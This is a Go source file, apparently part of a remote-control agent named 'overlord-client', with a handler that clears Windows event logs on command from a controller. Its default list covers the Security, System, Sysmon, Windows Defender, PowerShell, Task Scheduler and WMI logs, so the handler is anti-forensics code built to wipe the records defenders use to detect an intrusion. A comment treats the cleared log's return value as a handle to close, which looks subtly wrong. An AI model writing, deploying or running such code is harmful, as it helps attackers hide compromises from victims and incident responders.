//go:build windows
// +build windows

package handlers

import (
	"context"
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"

	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

var (
	wevtapi        = windows.NewLazySystemDLL("wevtapi.dll")
	procEvtClearLog = wevtapi.NewProc("EvtClearLog")
	procEvtOpenLog  = wevtapi.NewProc("EvtOpenLog")
	procEvtClose    = wevtapi.NewProc("EvtClose")
)

// defaultLogs are cleared when no specific channels are requested.
var defaultLogs = []string{
	"Security",
	"System",
	"Application",
	"Microsoft-Windows-PowerShell/Operational",
	"Microsoft-Windows-Sysmon/Operational",
	"Microsoft-Windows-Windows Defender/Operational",
	"Microsoft-Windows-TaskScheduler/Operational",
	"Microsoft-Windows-WMI-Activity/Operational",
}

// HandleEventLogClear clears Windows event log channels.
// payload["channels"] is an optional []interface{} of channel name strings.
// If absent or empty, the default set is cleared.
func HandleEventLogClear(ctx context.Context, env *agentRuntime.Env, cmdID string, payload map[string]interface{}) error {
	channels := defaultLogs
	if raw, ok := payload["channels"]; ok {
		if list, ok := raw.([]interface{}); ok && len(list) > 0 {
			channels = nil
			for _, v := range list {
				if s, ok := v.(string); ok && s != "" {
					channels = append(channels, s)
				}
			}
		}
	}

	cleared, failed := clearLogs(channels)

	msg := fmt.Sprintf("cleared %d/%d channels", cleared, len(channels))
	if len(failed) > 0 {
		msg += fmt.Sprintf("; failed: %s", strings.Join(failed, ", "))
	}
	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        cleared > 0 || len(failed) == 0,
		Message:   msg,
	})
}

func clearLogs(channels []string) (cleared int, failed []string) {
	for _, ch := range channels {
		if err := evtClearLog(ch); err != nil {
			failed = append(failed, ch)
		} else {
			cleared++
		}
	}
	return
}

func evtClearLog(channel string) error {
	ch16, err := windows.UTF16PtrFromString(channel)
	if err != nil {
		return err
	}
	// EvtClearLog(NULL, channelPath, NULL, 0)
	// Returns a non-zero handle on success; ERROR_EVT_CHANNEL_NOT_FOUND is not fatal.
	r, _, lastErr := procEvtClearLog.Call(
		0,
		uintptr(unsafe.Pointer(ch16)),
		0,
		0,
	)
	if r == 0 {
		code := lastErr.(windows.Errno)
		// 15007 = ERROR_EVT_CHANNEL_NOT_FOUND — channel doesn't exist, skip silently
		if code == 15007 {
			return nil
		}
		return fmt.Errorf("EvtClearLog(%s): %w", channel, lastErr)
	}
	// r is a session handle we don't need — close it
	procEvtClose.Call(r)
	return nil
}
